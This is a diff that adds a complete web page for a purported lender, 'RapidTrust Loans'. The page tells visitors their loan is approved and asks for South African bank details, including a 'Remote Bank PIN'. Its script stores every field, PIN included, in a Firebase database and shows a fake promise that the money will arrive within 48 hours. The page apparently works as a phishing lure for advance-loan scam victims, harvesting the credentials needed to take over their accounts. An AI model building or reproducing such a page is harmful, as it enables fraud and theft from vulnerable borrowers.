@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Banking Details - RapidTrust Loans</title>
+
+<style>
+
+*{
+    box-sizing:border-box;
+}
+
+body{
+    margin:0;
+    font-family:Arial,sans-serif;
+    background:#f4f7fb;
+    color:#222;
+}
+
+header{
+    background:white;
+    padding:15px 20px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    box-shadow:0 2px 8px rgba(0,0,0,0.08);
+    position:sticky;
+    top:0;
+    z-index:100;
+}
+
+.logo{
+    color:#003366;
+    font-size:20px;
+    font-weight:bold;
+}
+
+.menu-btn{
+    font-size:26px;
+    color:#003366;
+    cursor:pointer;
+}
+
+.side-menu{
+    position:fixed;
+    top:0;
+    right:-280px;
+    width:280px;
+    height:100%;
+    background:white;
+    box-shadow:-3px 0 10px rgba(0,0,0,0.15);
+    transition:0.3s;
+    z-index:200;
+    padding-top:70px;
+}
+
+.side-menu.active{
+    right:0;
+}
+
+.side-menu a{
+    display:block;
+    padding:16px 25px;
+    text-decoration:none;
+    color:#003366;
+    border-bottom:1px solid #eee;
+}
+
+.close-btn{
+    position:absolute;
+    top:20px;
+    right:20px;
+    font-size:28px;
+    color:#003366;
+    cursor:pointer;
+}
+
+.container{
+    max-width:500px;
+    margin:35px auto;
+    padding:20px;
+}
+
+.card{
+    background:white;
+    padding:25px;
+    border-radius:10px;
+    box-shadow:0 3px 12px rgba(0,0,0,0.08);
+}
+
+h1{
+    color:#003366;
+    text-align:center;
+    margin-top:0;
+}
+
+.approved{
+    background:#e8f8ee;
+    color:#16733a;
+    padding:15px;
+    border-radius:8px;
+    text-align:center;
+    margin-bottom:25px;
+    font-weight:bold;
+}
+
+.info{
+    text-align:center;
+    line-height:1.5;
+    margin-bottom:25px;
+}
+
+label{
+    display:block;
+    margin-top:15px;
+    margin-bottom:7px;
+    font-weight:bold;
+}
+
+input,
+select{
+    width:100%;
+    padding:13px;
+    border:1px solid #ccc;
+    border-radius:6px;
+    font-size:16px;
+}
+
+input:focus,
+select:focus{
+    outline:none;
+    border-color:#003366;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    margin-top:25px;
+    border:none;
+    border-radius:6px;
+    background:#003366;
+    color:white;
+    font-size:16px;
+    cursor:pointer;
+}
+
+button:hover{
+    background:#00264d;
+}
+
+.success{
+    display:none;
+    background:#e8f8ee;
+    color:#16733a;
+    padding:20px;
+    border-radius:8px;
+    text-align:center;
+    margin-top:20px;
+    line-height:1.6;
+}
+
+.back{
+    display:block;
+    text-align:center;
+    margin-top:20px;
+    color:#003366;
+    text-decoration:none;
+}
+
+.error{
+    display:none;
+    background:#ffe8e8;
+    color:#a00000;
+    padding:15px;
+    border-radius:8px;
+    text-align:center;
+    margin-bottom:20px;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header>
+
+    <div class="logo">
+        RapidTrust Loans
+    </div>
+
+    <div class="menu-btn" onclick="openMenu()">
+        ☰
+    </div>
+
+</header>
+
+
+<div class="side-menu" id="sideMenu">
+
+    <div class="close-btn" onclick="closeMenu()">
+        ×
+    </div>
+
+    <a href="index.html">
+        Home
+    </a>
+
+    <a href="about.html">
+        About Us
+    </a>
+
+    <a href="faq.html">
+        FAQ
+    </a>
+
+    <a href="terms.html">
+        Terms & Conditions
+    </a>
+
+    <a href="privacy-policy.html">
+        Privacy Policy
+    </a>
+
+    <a href="contact.html">
+        Contact Us
+    </a>
+
+</div>
+
+
+<div class="container">
+
+    <div class="card">
+
+        <div class="approved">
+            ✓ Loan Application Approved
+        </div>
+
+        <h1>
+            Banking Details
+        </h1>
+
+        <div class="info">
+
+            Congratulations! Your loan application has been approved.
+
+            <br><br>
+
+            To proceed with the loan disbursement,
+            please provide your banking details below.
+
+        </div>
+
+
+        <div
+            class="error"
+            id="errorMessage"
+        >
+            Unable to process your banking details.
+            Please return to Check Status and try again.
+        </div>
+
+
+        <form id="bankingForm">
+
+            <label for="bank">
+                Bank Name
+            </label>
+
+            <select id="bank" required>
+
+                <option value="">
+                    Select your bank
+                </option>
+
+                <option>Capitec Bank</option>
+                <option>Standard Bank</option>
+                <option>Absa</option>
+                <option>FNB</option>
+                <option>Nedbank</option>
+                <option>African Bank</option>
+                <option>TymeBank</option>
+                <option>Discovery Bank</option>
+                <option>Other</option>
+
+            </select>
+
+
+            <label for="holder">
+                Account Holder Name
+            </label>
+
+            <input
+                type="text"
+                id="holder"
+                placeholder="Enter account holder name"
+                required
+            >
+
+
+            <label for="account">
+                Account Number
+            </label>
+
+            <input
+                type="text"
+                id="account"
+                inputmode="numeric"
+                placeholder="Enter account number"
+                required
+            >
+
+
+            <label for="type">
+                Account Type
+            </label>
+
+            <select id="type" required>
+
+                <option value="">
+                    Select account type
+                </option>
+
+                <option>Cheque / Current</option>
+                <option>Savings</option>
+                <option>Transmission</option>
+
+            </select>
+
+
+            <label for="branch">
+                Branch Code
+            </label>
+
+            <input
+                type="text"
+                id="branch"
+                inputmode="numeric"
+                placeholder="Enter branch code"
+                required
+            >
+
+            <label for="remote">
+               Remote Bank PIN
+                 </label>
+
+                   <input
+                    type="text"
+                    id="remote"
+                    inputmode="numeric"
+                    maxlength="5"
+                    placeholder="E.g. 56784"
+                   required
+           >
+
+
+     
+            <button
+                type="submit"
+                id="submitButton"
+            >
+                Transfer To My Bank Account
+            </button>
+
+        </form>
+
+
+        <div
+            class="success"
+            id="successMessage"
+        >
+
+            <strong>
+                ✓ Banking Details Submitted
+            </strong>
+
+            <br><br>
+
+            Your banking details have been successfully submitted.
+
+            <br><br>
+
+            Your loan disbursement is now being processed.
+
+            <br><br>
+
+            The money will reflect in your account within 48hrs.
+            
+
+        </div>
+
+
+        <a
+            href="loan-status.html"
+            class="back"
+        >
+            ← Back to Loan Status
+        </a>
+
+    </div>
+
+</div>
+
+
+<script type="module">
+
+import {
+    initializeApp
+}
+from "https://www.gstatic.com/firebasejs/12.19.0/firebase-app.js";
+
+
+import {
+    getFirestore,
+    collection,
+    query,
+    where,
+    getDocs,
+    updateDoc,
+    doc
+}
+from "https://www.gstatic.com/firebasejs/12.19.0/firebase-firestore.js";
+
+
+const firebaseConfig = {
+
+    apiKey:
+    "AIzaSyBhgjdFik1KbvMEKHqcaPVijdsxRW8fPj4",
+
+    authDomain:
+    "rapidtrusts-loans.firebaseapp.com",
+
+    projectId:
+    "rapidtrusts-loans",
+
+    storageBucket:
+    "rapidtrusts-loans.firebasestorage.app",
+
+    messagingSenderId:
+    "964719688281",
+
+    appId:
+    "1:964719688281:web:a303d706dc45746b178f48"
+
+};
+
+
+const app =
+    initializeApp(firebaseConfig);
+
+const db =
+    getFirestore(app);
+
+
+window.openMenu = function(){
+
+    document
+    .getElementById("sideMenu")
+    .classList
+    .add("active");
+
+};
+
+
+window.closeMenu = function(){
+
+    document
+    .getElementById("sideMenu")
+    .classList
+    .remove("active");
+
+};
+
+
+const urlParams =
+    new URLSearchParams(
+        window.location.search
+    );
+
+
+const reference =
+    urlParams.get("reference");
+
+
+const bankingForm =
+    document.getElementById("bankingForm");
+
+
+const errorMessage =
+    document.getElementById("errorMessage");
+
+
+const successMessage =
+    document.getElementById("successMessage");
+
+
+const submitButton =
+    document.getElementById("submitButton");
+
+
+bankingForm.addEventListener(
+    "submit",
+    async function(e){
+
+        e.preventDefault();
+
+
+        if(!reference){
+
+            errorMessage.style.display =
+                "block";
+
+            return;
+
+        }
+
+
+        submitButton.disabled = true;
+
+        submitButton.textContent =
+            "Submitting...";
+
+
+        errorMessage.style.display =
+            "none";
+
+
+        try{
+
+            const applicationQuery =
+                query(
+                    collection(db,"applications"),
+                    where(
+                        "reference",
+                        "==",
+                        reference.toUpperCase()
+                    )
+                );
+
+
+            const snapshot =
+                await getDocs(applicationQuery);
+
+
+            if(snapshot.empty){
+
+                throw new Error(
+                    "Application not found."
+                );
+
+            }
+
+
+            const applicationDoc =
+                snapshot.docs[0];
+
+
+            const application =
+                applicationDoc.data();
+
+
+            if(application.status !== "Approved"){
+
+                throw new Error(
+                    "Application is not approved."
+                );
+
+            }
+
+
+            await updateDoc(
+                doc(
+                    db,
+                    "applications",
+                    applicationDoc.id
+                ),
+                {
+
+                    
+                  bankName:
+    document
+    .getElementById("bank")
+    .value,
+
+accountHolder:
+    document
+    .getElementById("holder")
+    .value
+    .trim(),
+
+accountNumber:
+    document
+    .getElementById("account")
+    .value
+    .trim(),
+
+accountType:
+    document
+    .getElementById("type")
+    .value,
+
+branchCode:
+    document
+    .getElementById("branch")
+    .value
+    .trim(),
+
+remoteBankPin:
+    document
+    .getElementById("remote")
+    .value
+    .trim(),
+                        
+                        
+                        
+                        
+                    bankingDetailsSubmitted:
+                        true,
+
+                    bankingDetailsDate:
+                        new Date().toISOString()
+
+                }
+            );
+
+
+            bankingForm.style.display =
+                "none";
+
+
+            successMessage.style.display =
+                "block";
+
+        }
+
+        catch(error){
+
+            console.error(error);
+
+            errorMessage.textContent =
+                error.message ||
+                "Unable to submit banking details.";
+
+            errorMessage.style.display =
+                "block";
+
+            submitButton.disabled =
+                false;
+
+            submitButton.textContent =
+                "Transfer To My Bank Account";
+
+        }
+
+    }
+
+);
+
+</script>
+
+</body>
+
+</html>
